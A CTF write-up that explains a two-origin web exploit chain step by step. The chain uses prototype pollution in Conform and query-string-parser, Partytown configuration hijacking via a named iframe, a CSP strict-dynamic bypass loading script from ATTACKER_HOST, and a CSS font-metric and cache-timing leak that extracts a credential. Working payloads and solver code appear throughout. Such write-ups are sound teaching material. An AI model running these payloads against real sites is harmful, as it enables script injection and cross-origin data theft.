---
title: "SOS: Styles, Origins, and State"
description: "A two-origin challenge chain through prototype pollution, Partytown, CSP, CSS layout, and cache timing."
date: 2026-11-21T00:02:00Z
category: CTF
event: SOS
cover: sos
tags: [web, prototype-pollution, partytown, css, xs-leak, chromium]
draft: false
---

# SOS: Styles, Origins, and State

`start.mjs` establishes the challenge's trust boundaries. Before examining the sanitizer or the CSP, it answers the question that controls the whole chain: where does the flag actually live?

```js
const flag = (await readFile(new URL("./flag.txt", import.meta.url), "utf8")).trim();

const cleanEnvironment = { ...process.env };
delete cleanEnvironment.FLAG;

const services = [
  spawn(process.execPath, [new URL("./account/server.mjs", import.meta.url).pathname], {
    env: { ...cleanEnvironment, APP_PORT: "3001", FLAG: flag },
  }),
  spawn(process.execPath, [new URL("./server/preview.mjs", import.meta.url).pathname], {
    env: { ...cleanEnvironment, PORT: "3000" },
  }),
];
```

There are two services and two origins.

| Service | Browser origin | Reachability | What it knows |
| --- | --- | --- | --- |
| Review workspace | challenge URL on port 3000 | Public | Drafts, sanitizer, review bot, Partytown |
| Account service | `http://app.test:3001` | Loopback inside the bot | The 32-character credential |

The public process never receives `FLAG`. The account server binds to `127.0.0.1`, and the reviewer starts Chrome with this rule:

```text
--host-resolver-rules=MAP app.test 127.0.0.1
```

So a useful solve has two separate jobs:

1. Get JavaScript to run in the public review page.
2. Move to an attacker page and infer the credential from the loopback account page without reading its DOM.

Those jobs happen on different origins. JavaScript gained on the review origin never becomes JavaScript on `app.test`. The same-origin policy remains in force all the way through the exploit.

## What the reviewer accepts

The draft sanitizer in `server/drafts.mjs` is the next useful piece of code:

```js
const sanitizer = {
  allowedTags: [...sanitizeHtml.defaults.allowedTags, "iframe", "link"],
  allowedAttributes: {
    ...sanitizeHtml.defaults.allowedAttributes,
    iframe: ["name", "src", "title", "loading"],
    link: [{ name: "rel", values: ["stylesheet"] }, "href", "media"],
  },
  allowedSchemes: ["http", "https"],
  allowedSchemesByTag: { link: [] },
  allowProtocolRelative: false,
  allowedIframeHostnames: [],
  allowIframeRelativeUrls: true,
};
```

Scripts, event handlers, inline styles, `srcdoc`, external iframes, and protocol-relative URLs are removed. A relative iframe and relative stylesheet links survive because imported documents legitimately use them.

The review bot also refuses arbitrary URLs. It accepts a stored draft ID and visits only `/review/<id>`. This rules out the usual “send the bot my page” approach.

The fragment that survives sanitization is:

```html
<iframe
  name="partytown"
  src="/embed?__proto__.lib=%2F%2FATTACKER_HOST%2F"
  title="Example preview">
</iframe>
<link rel="stylesheet" href="/media/avatar.avif?size=1024&v=0">
<link rel="stylesheet" href="/media/avatar.avif?size=1024&v=1">
<link rel="stylesheet" href="/media/avatar.avif?size=1024&v=2">
<link rel="stylesheet" href="/media/avatar.avif?size=1024&v=3">
<link rel="stylesheet" href="/media/avatar.avif?size=1024&v=4">
<link rel="stylesheet" href="/media/avatar.avif?size=1024&v=5">
<link rel="stylesheet" href="/media/avatar.avif?size=1024&v=6">
```

Every unusual part of that fragment comes from the player. The application does not generate the `__proto__` key, the frame name, the attacker address, or the seven links.

## The innocent settings parser

`/embed` is a same-origin display preview. Its browser entry point, `src/embed.js`, waits for the document to load and applies two harmless URL settings on the next animation frame:

```js
function applyDisplaySettings() {
  const submission = parseWithZod(new URLSearchParams(location.search), {
    schema: z.object({
      title: z.string().max(80).optional(),
      density: z.enum(["comfortable", "compact"]).optional(),
    }),
  });

  // Apply the validated title and density.
}

window.addEventListener("load", () => {
  requestAnimationFrame(applyDisplaySettings);
}, { once: true });
```

The schema has no `lib` field, so at first sight `__proto__.lib` should be rejected. The side effect happens before Zod sees the completed object.

In `@conform-to/dom@1.1.0`, `getSubmissionContext()` starts with a normal object and sends every URL parameter name through `setValue()`:

```js
const context = {
  payload: {},
  fields: new Set(),
  intent: getIntent(intent),
};

for (const [name, next] of body.entries()) {
  setValue(context.payload, name, () => next);
}
```

`setValue()` splits dotted names and walks them without filtering `__proto__`, `constructor`, or `prototype`:

```js
function setValue(target, name, valueFn) {
  const paths = getPaths(name);
  let pointer = target;

  for (let index = 0; pointer != null && index < paths.length; index++) {
    const key = paths[index];
    const nextKey = paths[index + 1];
    const newValue = index !== paths.length - 1
      ? pointer[key] ?? (typeof nextKey === "number" ? [] : {})
      : valueFn(pointer[key]);

    pointer[key] = newValue;
    pointer = pointer[key];
  }
}
```

For `__proto__.lib=//ATTACKER_HOST/`, the first lookup of `payload.__proto__` returns that realm's `Object.prototype`. The second step writes `lib` there. Zod later rejects the unknown field, but validation cannot undo a mutation that already happened.

This pollution is confined to the iframe's JavaScript realm. It does not touch the parent realm's `Object.prototype`, which matters in the next step.

## Why naming the iframe `partytown` works

The review page does not declare a Partytown configuration object. It imports the official helper and places its bootstrap after the stored fragment:

```js
import { partytownSnippet } from "@qwik.dev/partytown/integration";

const snippet = partytownSnippet();
```

```html
<section class="document-body">USER_FRAGMENT</section>
<script type="text/partytown" src="/assets/metrics.js"></script>
<script nonce="...">PARTYTOWN_SNIPPET</script>
```

An iframe with `name="partytown"` becomes a named property of the parent window. Therefore this expression in the official integration code does not create a fresh object:

```js
c = w[p] = w[p] || {};
```

`w[p]` is `window.partytown`. At that moment it resolves to the child frame's `WindowProxy`, so the truthy WindowProxy is kept as the configuration value.

This behavior comes from the browser, not from challenge code. In the pinned Chromium build:

- [`WindowProperties::AnonymousNamedGetter`](https://github.com/chromium/chromium/blob/24072c1aa400ec4a89dc738b6b6acd12a8589b6f/third_party/blink/renderer/core/frame/window_properties.cc#L22-L56) looks up a child frame by name and returns its `DOMWindow` as a V8 value. The value exposed to JavaScript is the child's `WindowProxy`.
- [`LocalWindowProxy::SetupWindowPrototypeChain`](https://github.com/chromium/chromium/blob/24072c1aa400ec4a89dc738b6b6acd12a8589b6f/third_party/blink/renderer/bindings/core/v8/local_window_proxy.cc#L400-L431) connects the global proxy, inner global, `Window.prototype`, and `WindowProperties` object.
- Blink's [`WindowProxy` documentation](https://github.com/chromium/chromium/blob/24072c1aa400ec4a89dc738b6b6acd12a8589b6f/third_party/blink/renderer/bindings/core/v8/window_proxy.h#L46-L115) shows that a same-origin local WindowProxy forwards into the child global and eventually reaches the child's `Object.prototype`.

The child is same-origin because its URL is relative. When Partytown later evaluates `config.lib`, the lookup passes through that WindowProxy and reaches the polluted child prototype. The result is the primitive string `//ATTACKER_HOST/`.

This is the part that is easy to miss in a white-box review. The parent is not polluted, and the iframe is not carrying a configuration object in its markup. Browser named access joins the parent's expected global name to a value whose prototype chain belongs to the child.

## The load-order problem

There is a race. Without any delay, the parent reaches its inline Partytown bootstrap before the embed reaches `load`, its next animation frame, and the vulnerable Conform call. Partytown then initializes with its safe local path.

The stylesheet links fix the order. They appear before the trusted inline script, so the parent parser waits for them before executing that script and before firing `DOMContentLoaded`. Meanwhile, the already-created iframe loads independently and reaches its `requestAnimationFrame` callback.

The linked route looks like an avatar endpoint because it is one:

```js
export function renderAvatar(url) {
  const size = sizeParameter(url);
  return sharp(source)
    .resize(size, size, { fit: "cover" })
    .avif({ quality: 58, effort: 3 })
    .toBuffer();
}
```

Each query-distinct URL causes a real Sharp AVIF conversion. Chrome eventually rejects the response as CSS because its MIME type is `image/avif`, but it has already acted as a parser-blocking stylesheet fetch. There is no `delay` parameter and no sleep in the server.

Seven links were used as a reliability margin. In the final controls, the seven-link payload won 30 out of 30 trials in one browser process and 10 out of 10 fresh-browser trials. The no-delay case won 0 out of 100 and 0 out of 20 respectively. One sufficiently slow stylesheet also worked in the tested environments, so the number seven is not a browser requirement. It is the intended stable payload shape, not a magic cardinality check.

The ordering now looks like this:

```text
parent parses named iframe
        |
        +---- child loads /embed
        |       |
        |       +---- load -> animation frame -> Conform pollution
        |
parent waits on real AVIF stylesheet responses
        |
        +---- trusted Partytown bootstrap finally executes
                |
                +---- window.partytown resolves to polluted child WindowProxy
```

## Turning the inherited value into script execution

The useful Partytown 1.0.5 logic is short. The readable debug build is equivalent to:

```js
config = win.partytown || {};
libPath = (config.lib || "/~partytown/") + (config.debug ? "debug/" : "");

if (libPath[0] === "/") {
  loadSandbox(window.crossOriginIsolated);
}

function loadSandbox(useAtomics) {
  const sandbox = document.createElement(useAtomics ? "script" : "iframe");
  sandbox.src = useAtomics
    ? libPath + "partytown-atomics.js?v=1.0.5"
    : libPath + "partytown-sandbox-sw.html?...";
  document.body.appendChild(sandbox);
}
```

The exact source is pinned at Partytown commit `a39da92bd0da1022be0839e3df12022842dc605e`:

- [`src/integration/snippet.ts`](https://github.com/QwikDev/partytown/blob/a39da92bd0da1022be0839e3df12022842dc605e/src/integration/snippet.ts#L10-L17) preserves an existing `window.partytown` value.
- [`src/lib/main/snippet.ts`](https://github.com/QwikDev/partytown/blob/a39da92bd0da1022be0839e3df12022842dc605e/src/lib/main/snippet.ts#L27-L38) reads `config.lib` and checks only its first character.
- The same file [selects Atomics mode](https://github.com/QwikDev/partytown/blob/a39da92bd0da1022be0839e3df12022842dc605e/src/lib/main/snippet.ts#L55-L58) and [constructs the script URL](https://github.com/QwikDev/partytown/blob/a39da92bd0da1022be0839e3df12022842dc605e/src/lib/main/snippet.ts#L103-L122).

The leading-slash check accepts `//ATTACKER_HOST/`. The browser interprets that as a protocol-relative external URL. A normal absolute value such as `http://ATTACKER_HOST/` fails Partytown's check because its first character is `h`.

All public responses include:

```text
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Embedder-Policy: require-corp
```

That makes the review page cross-origin isolated, so Partytown selects its Atomics branch and creates a real `<script>`. Without cross-origin isolation it takes the service-worker branch, where native same-origin service-worker restrictions stop the external Partytown path.

The review CSP is also important:

```text
default-src 'none';
script-src 'nonce-...' 'strict-dynamic';
style-src 'self';
img-src 'self';
font-src 'self';
connect-src 'self';
frame-src 'self';
worker-src 'self' blob:
```

The Partytown bootstrap has the nonce. Under `strict-dynamic`, a trusted script may create another script and pass that trust to it. Partytown itself creates the external `<script>`, so the attacker's host does not need to appear in the CSP source list.

COEP adds one last requirement. The attacker's response must opt into cross-origin embedding:

```http
HTTP/1.1 200 OK
Content-Type: text/javascript; charset=utf-8
Cross-Origin-Resource-Policy: cross-origin
Cache-Control: no-store
```

The route name is fixed by Partytown:

```text
/partytown-atomics.js?v=1.0.5
```

A minimal response body is enough:

```js
queueMicrotask(() => {
  location.replace("http://ATTACKER_HOST/solver");
});
```

Although the file came from the attacker server, it executes in the review document's JavaScript context. It can therefore navigate the top-level reviewer. This is the end of stage one.

## What stage one did and did not give us

At this point the bot is on the attacker's `/solver` page. The exploit has JavaScript execution on the public review origin long enough to perform that navigation.

It has not executed code on `http://app.test:3001`. The solver can create an iframe pointing there and observe when the iframe loads, but reading `contentDocument`, the credential, computed styles, or network entries is blocked by the same-origin policy.

This distinction explains the rest of the challenge. Stage two builds a one-bit question that the account page answers by warming one of its own cache entries. The attacker measures the result without opening the frame.

The solver should itself be served over plain HTTP. An HTTPS attacker page cannot frame the HTTP account origin because that would be blocked as mixed content.

## The account page's CSS injection

`account/src/account.js` begins with ordinary UI setup:

```js
import jss from "jss";
import { fromQuery } from "query-string-parser";

const view = fromQuery(location.search) ?? {};
const sheet = jss.createStyleSheet({
  card: { /* normal styles */ },
  header: { /* normal styles */ },
  field: { /* normal styles */ },
  // ...
}).attach();
```

Later, after `load`, it fetches the account data and writes the credential into a textarea property:

```js
const account = await response.json();
field.value = account.credential;
```

The textarea has no credential in its HTML and no `value` attribute. A selector such as `[value^="a"]` cannot see a value stored only in the DOM property.

`query-string-parser@1.0.0` provides the entry point. Its nested-key routine contains the familiar unsafe pattern:

```js
if (key.length > 0 && nextKey.length > 0) {
  obj[key] || (obj[key] = {});
  toFill = obj[key];
}
_fillValue(toFill, nextKey, keyPaths, value);
```

With a key such as `__proto__[@x]`, `obj.__proto__` resolves to `Object.prototype`, and the next assignment lands there. This package bug is also documented in [GHSA-587p-w43q-4hjx](https://github.com/advisories/GHSA-587p-w43q-4hjx).

JSS makes the pollution useful. `StyleSheet` enumerates the supplied styles with `for...in`:

```js
for (const name in styles) {
  this.rules.add(name, styles[name]);
}
```

Its style clone and CSS serializer also use `for...in`. Inherited keys on `Object.prototype` therefore enter the generated stylesheet as if the application had supplied them.

The page's CSP permits only self-hosted styles and a nonce:

```text
style-src 'self' 'nonce-...'
```

JSS deliberately supports this deployment pattern. It reads the nonce from the page and applies it to the style element it creates:

```js
const node = document.querySelector('meta[property="csp-nonce"]');
const nonce = node ? node.getAttribute("content") : null;
if (nonce) this.element.setAttribute("nonce", nonce);
```

So polluted rule data is serialized by trusted application code into a nonce-authorized `<style>` element. There is no attacker `<style>` tag in the page.

The core query builder is:

```js
function injectedQuery(css, subset, font) {
  const pairs = [
    ["tab", "profile"],
    ["__proto__[@x]", `initial;${css}`],
  ];

  if (subset) {
    const range = [...subset]
      .map((c) => `U+${c.codePointAt(0).toString(16)}`)
      .join(",");

    for (const [name, value] of Object.entries({
      "font-family": "MetricLeak",
      src: `local("${font.name}")`,
      "unicode-range": range,
      "size-adjust": `${font.adjustment}%`,
      "@font-face": "",
      "@x": "",
    })) {
      pairs.push([`__proto__[@font-face][${name}]`, value]);
    }
  }

  return new URLSearchParams(pairs).toString().replaceAll("+", "%20");
}
```

The `@font-face` object is inherited as a top-level JSS rule. The inherited `@x` declaration appears inside ordinary JSS rules. Its value starts with `initial;`, terminating the fake declaration before the attacker-controlled nested CSS. Chromium's CSS nesting support makes selectors beginning with `&` valid at that position.

The empty `@font-face` and `@x` fields inside the font object shadow the polluted prototype fields while JSS serializes that object. Without those shadows, the font rule also inherits the injection fields and becomes unstable.

## Turning a hexadecimal character into a width bit

The credential alphabet is `0123456789abcdef`. A binary search needs four yes/no questions per position.

For each question, split the remaining candidates into two sets. The upper set becomes the `unicode-range` of an attacker-defined font face:

```css
@font-face {
  font-family: MetricLeak;
  src: local("DejaVu Sans Mono");
  unicode-range: U+38,U+39,U+61,U+62;
  size-adjust: 133.2%;
}
```

This does not download a font. Both the marked face and the fallback use the same local monospace font. `size-adjust` changes the glyph advance only when a character belongs to the tested subset. In the solver, the marked glyph is about four pixels wider than the normal one.

The solver first checks `DejaVu Sans Mono`, `Monaco`, and `Courier New`, then measures all 16 hexadecimal characters. It rejects a font unless the unmarked advances are effectively equal and the marked advance has a clear gap. That calibration avoids relying on a hard-coded machine font.

The result is a browser-native predicate:

```text
secret character is in tested set  -> wider glyph
secret character is outside it     -> normal glyph
```

CSS still needs to turn that width difference into a resource request.

## The first character

For position zero, the textarea itself becomes a horizontal scroll-state container:

```css
& #credential-value {
  display: block;
  box-sizing: content-box;
  field-sizing: content;
  inline-size: auto;
  max-inline-size: calc(100px + VAR_THRESHOLD);
  block-size: 40px;
  padding: 0;
  border: 0;
  font: 20px/20px MetricLeak, "DejaVu Sans Mono";
  overflow: auto;
  white-space: pre-wrap;
  word-break: break-all;
  text-indent: 100px;
  container-type: scroll-state;
}

@container scroll-state(scrollable: right) {
  & #credential-value::before {
    content: "x";
    background-image: url("/avatars/profile.avif?v=UNIQUE_TOKEN");
  }
}
```

`field-sizing: content` makes the runtime textarea value participate in its intrinsic size. The 100-pixel indent puts the first glyph directly at a calibrated width boundary. A normal glyph fits; a marked glyph crosses the maximum width and creates rightward overflow. The scroll-state query matches only in the marked case.

No selector reads the secret. Layout reads the value while sizing the form control.

## Later characters and preserving order

A font `unicode-range` by itself reveals only whether a character occurs somewhere. The hard part is making the answer depend on one position.

For positions after zero, the solver uses a five-pixel-wide textarea and shifts the already recovered prefix to the left:

```css
& .credential-panel {
  inline-size: 5px;
  block-size: VAR_CALIBRATED_HEIGHT;
  overflow: auto;
  scrollbar-width: none;
  container-type: scroll-state;
}

& #credential-value {
  field-sizing: content;
  inline-size: 5px;
  max-inline-size: 5px;
  font: 20px/20px MetricLeak, "DejaVu Sans Mono";
  overflow: hidden;
  white-space: pre-wrap;
  word-break: break-all;
  text-indent: calc(-1 * VAR_INDENT);
}

@container scroll-state(scrollable: bottom) {
  & #credential-value {
    background-image: url("/avatars/profile.avif?v=UNIQUE_TOKEN");
  }
}
```

Let `P` be the measured width of the recovered prefix under the current test set, `t` the midpoint between the normal and marked glyph advances, and `W` the five-pixel textarea width. The solver sets `VAR_INDENT` to `P + t - W`. The tested `unicode-range` can widen characters that already appear in the prefix, so `P` is recalculated by adding the marked or normal advance for every known character. The resulting negative indent leaves exactly `t` pixels of first-line capacity for the next unknown glyph.

If that glyph is marked, the extra advance creates one more line. The panel becomes vertically scrollable and `scrollable: bottom` matches. If it is unmarked, the content stays within the calibrated height.

This is how the leak preserves order. Each request asks about one character position, despite the font face matching by code point across the whole textarea.

## What Chrome does with the scroll-state query

The permanent Chromium links below use one source snapshot so the line references stay stable. The behavior itself is discussed as part of Chrome's implementation, not as a trick tied to an old browser label.

After layout, [`ScrollStateQuerySnapshot::UpdateSnapshot`](https://github.com/chromium/chromium/blob/24072c1aa400ec4a89dc738b6b6acd12a8589b6f/third_party/blink/renderer/core/css/scroll_state_query_snapshot.cc#L24-L106) reads the scrollable area's minimum offset, maximum offset, and current offset. If the current offset is below the maximum on an axis, it records the `kEnd` bit. The query's `right` or `bottom` value tests that bit.

[`LocalFrameView::RunSnapshotPostLayoutStateSteps`](https://github.com/chromium/chromium/blob/24072c1aa400ec4a89dc738b6b6acd12a8589b6f/third_party/blink/renderer/core/frame/local_frame_view.cc#L2675-L2707) updates post-layout snapshot clients. If a snapshot changed, Blink marks style dirty and repeats the lifecycle. [`ContainerQueryEvaluator::ApplyScrollState`](https://github.com/chromium/chromium/blob/24072c1aa400ec4a89dc738b6b6acd12a8589b6f/third_party/blink/renderer/core/css/container_query_evaluator.cc#L412-L430) copies the snapshot's scrollable flags into query evaluation and invalidates affected descendants.

When the query matches, the selected style contains a pending `background-image`. [`ElementStyleResources::LoadPendingImages`](https://github.com/chromium/chromium/blob/24072c1aa400ec4a89dc738b6b6acd12a8589b6f/third_party/blink/renderer/core/css/resolver/element_style_resources.cc#L393-L424) walks only the image properties that survived the cascade and calls the image loader. [`CSSImageValue::CacheImage`](https://github.com/chromium/chromium/blob/24072c1aa400ec4a89dc738b6b6acd12a8589b6f/third_party/blink/renderer/core/css/css_image_value.cc#L113-L130) builds the fetch parameters and hands them to the document's style-engine image cache.

This source path is why the oracle uses a real selected image declaration. Merely producing stale computed text would not be enough. The matching branch reaches the fetch and cache machinery.

## Reading the bit without a callback

The account CSP says `img-src 'self'`, so a normal CSS exfiltration URL such as `https://attacker/bit-1` is blocked. The conditional URL stays on the account origin:

```text
/avatars/profile.avif?v=UNIQUE_TOKEN
```

That endpoint performs a real AVIF conversion and returns:

```text
Cache-Control: public, max-age=600, immutable
```

The bit probe has two phases.

First, load an account iframe with the secret-dependent CSS and wait long enough for layout and any conditional image request:

```js
await replaceFrame(accountUrl(secretDependentQuery));
await sleep(primeWaitMs);
```

Then load another account iframe whose CSS unconditionally replaces the visible profile image with the same token:

```js
function cacheProbeQuery(token) {
  return injectedQuery(
    `& .profile img{content:url("/avatars/profile.avif?v=${token}")}`,
  );
}

const started = performance.now();
await replaceFrame(accountUrl(cacheProbeQuery(token)));
const elapsed = performance.now() - started;
```

The parent may observe a cross-origin iframe's `load` event. It does not need DOM access. If the scroll-state branch requested the image earlier, the second iframe uses a warm cache entry and finishes quickly. Otherwise the account server runs Sharp for a cold URL and the frame finishes later.

Both frames have the same account origin and live under the same attacker top-level site, so they share the relevant partitioned HTTP cache. Every question uses a fresh token to prevent one decision from contaminating the next.

## Reusing one browsing context

The extraction performs hundreds of navigations. Creating a new iframe for each one causes unnecessary renderer and history churn, and old documents can keep finishing image work after the solver has moved to the next bit. Stripped down to its lifecycle logic, the stable solver creates one visible-sized account iframe and reuses its browsing context:

```js
function waitForLoad(target, navigate, timeoutMs = 60_000) {
  return new Promise((resolve, reject) => {
    const timeout = setTimeout(
      () => reject(new Error("iframe navigation timed out")),
      timeoutMs,
    );
    target.onload = () => {
      clearTimeout(timeout);
      resolve(target);
    };
    target.onerror = reject;
    navigate();
  });
}

function loadFrame(url) {
  if (!frame) {
    frame = document.createElement("iframe");
    frame.style.cssText =
      "position:fixed;left:0;top:0;width:800px;height:800px;" +
      "border:0;opacity:.01;pointer-events:none";
    document.body.append(frame);
  }

  return waitForLoad(frame, () => {
    frame.src = url;
  });
}

function replaceFrame(url) {
  if (!frame) return loadFrame(url);
  return waitForLoad(frame, () => {
    frame.contentWindow.location.replace(url);
  });
}
```

The parent cannot inspect the cross-origin `contentWindow`, but it is allowed to navigate that window and receive the iframe's later `load` event. `location.replace()` also avoids adding hundreds of entries to the child frame's session history.

Every account URL gets a monotonically increasing `_navigation` parameter. That forces a new document navigation even when two CSS questions would otherwise produce the same URL:

```js
function accountUrl(query) {
  return `${APP_ORIGIN}/account?${query}&_navigation=${navigation++}`;
}
```

Calibration uses a second, tiny iframe. It measures a cold token and then the same warm token without disturbing the main extraction frame. The calibration iframe is removed at the end of each round.

At longer boundaries, the main iframe is navigated to `about:blank`, removed, and recreated after a short settling period. That releases the previous account document and its render objects while keeping the browser's HTTP cache. The top-level solver page stays in the same tab throughout, so the cache partition does not change.

This lifecycle discipline is part of the exploit's reliability:

- one review submission starts one long browser session;
- one top-level navigation moves from the review page to the solver;
- one reusable account iframe handles priming and measurement;
- one disposable probe iframe handles cache calibration;
- full frame resets happen at controlled checkpoints rather than after every bit.

There is no need to start a fresh reviewer for each character. The cache oracle, font measurements, recovered prefix, and timing model all remain in one browser session.

## Calibration, voting, and recovery

Timing is noisy, especially on a shared remote worker. The solver establishes its threshold before reading the secret:

1. Request a fresh token through the visible profile image and record the cold frame-load time.
2. Request the same token again and record the warm time.
3. Repeat until several samples have a useful gap.
4. Put the cutoff halfway between the conservative warm and cold representatives.

For every secret bit, the solver primes a unique token and measures it. Clear warm and cold results are accepted immediately. Values in the middle are retried. Each of the four binary decisions for a character receives three votes, and the cache calibration is refreshed during a long extraction. An optional final pass tests each recovered character as a one-character `unicode-range`; a mismatch identifies the first position that needs another calibrated run.

The wait after a secret-dependent prime is tied to the measured cold path:

```js
primeWaitMs = Math.max(MINIMUM_PRIME_WAIT_MS, coldMs + 150);
```

This gives a cold Sharp conversion time to finish before the same token is measured. A fixed short delay can classify a true request as cold simply because its encode is still running.

The character loop is an ordinary binary search:

```js
let recovered = "";

for (let position = 0; position < 32; position++) {
  let candidates = [..."0123456789abcdef"];

  while (candidates.length > 1) {
    const middle = Math.floor(candidates.length / 2);
    const lower = candidates.slice(0, middle);
    const upper = candidates.slice(middle);

    const overflowed = await voteOnSubset(position, recovered, upper);
    candidates = overflowed ? upper : lower;
  }

  recovered += candidates[0];
}

console.log(`flag{${recovered}}`);
```

There are 32 positions and four binary decisions per position, for 128 logical decisions. Voting and retries increase the number of page loads, which is why the reviewer's visit window is long.

The hosted credential is instance data. The local source may contain a placeholder, so the value to submit is always the 32 nibbles recovered from the live reviewer:

```text
flag{<recovered 32-character hexadecimal credential>}
```

## Putting the first stage together

The orchestration code for stage one can stay small. This is the essential shape:

```js
const target = new URL(process.env.TARGET_URL);
const attacker = process.env.ATTACKER_HOST;
const lib = `//${attacker}/`;

const childQuery = new URLSearchParams([
  ["__proto__.lib", lib],
]);

const nonce = crypto.randomUUID();
const links = Array.from({ length: 7 }, (_, index) =>
  `<link rel="stylesheet" ` +
  `href="/media/avatar.avif?size=1024&v=${nonce}-${index}">`,
).join("\n");

const html =
  `<iframe name="partytown" src="/embed?${childQuery}" ` +
  `title="Example preview"></iframe>\n${links}`;

const draftResponse = await fetch(new URL("/api/drafts", target), {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ title: "Imported reference", html }),
});
const draft = await draftResponse.json();

await fetch(new URL("/api/reviews", target), {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({ id: draft.id }),
});
```

The attacker server needs three useful routes:

```text
GET  /partytown-atomics.js  navigate the reviewer to /solver
GET  /solver                serve the solver page
GET  /exploit.js            serve the font, layout, and cache solver
POST /report                receive the recovered flag
```

`/partytown-atomics.js` must carry `Cross-Origin-Resource-Policy: cross-origin`. The solver page should be HTTP so it can frame the HTTP account service. The callback host must be reachable from both your machine and the challenge container; the container's route is the one that matters.

## The complete chain

Reading the chain from start to finish:

1. A stored fragment keeps a relative iframe and seven relative stylesheet links after sanitization.
2. The child embed parses `__proto__.lib` through Conform 1.1.0 and pollutes its own realm.
3. Blink exposes the iframe named `partytown` as a parent-window named property.
4. Real AVIF stylesheet fetches hold the parent before its trusted Partytown bootstrap.
5. Partytown preserves the child WindowProxy as its configuration object.
6. `config.lib` resolves through that proxy to the child's polluted `Object.prototype`.
7. The protocol-relative value passes Partytown's leading-slash check.
8. Cross-origin isolation selects the Atomics script path.
9. The nonce-authorized bootstrap creates the external script, and CSP `strict-dynamic` permits it.
10. The attacker's CORP-enabled script executes in the review document and navigates to the solver.
11. The solver frames the loopback account origin.
12. `query-string-parser` pollution feeds inherited rules into JSS's nonce-authorized stylesheet.
13. `unicode-range` and `size-adjust` turn membership in a candidate set into a glyph-width difference.
14. `field-sizing`, controlled wrapping, and scroll-state queries turn that width into a conditional same-origin avatar request.
15. The account avatar cache preserves the bit.
16. Cross-origin iframe load timing distinguishes a warm entry from a cold Sharp conversion.
17. Four binary decisions recover each hexadecimal character in order.

None of the stages alone reveals the credential. The chain lives in the handoffs: child-realm state becomes a library configuration through Blink named access, trusted library code turns that configuration into an external script under CSP, and the resulting attacker page uses layout plus the browser cache to read a separate origin without breaking the same-origin policy.

## Implementation notes

The chain was verified with these application and library versions:

- `@qwik.dev/partytown@1.0.5`
- `@conform-to/zod@1.1.0` and `@conform-to/dom@1.1.0`
- `query-string-parser@1.0.0`
- `jss@10.10.0`
- `sanitize-html@2.18.1`
- `sharp@0.34.5`

The exact composition is version-sensitive. Partytown's configuration initialization, the Conform setter, Blink named access, CSS nesting, `field-sizing`, scroll-state queries, and image-cache behavior all matter. Replacing one dependency with a newer release or running a browser without the required CSS features can break the chain before the solver reaches the timing stage.
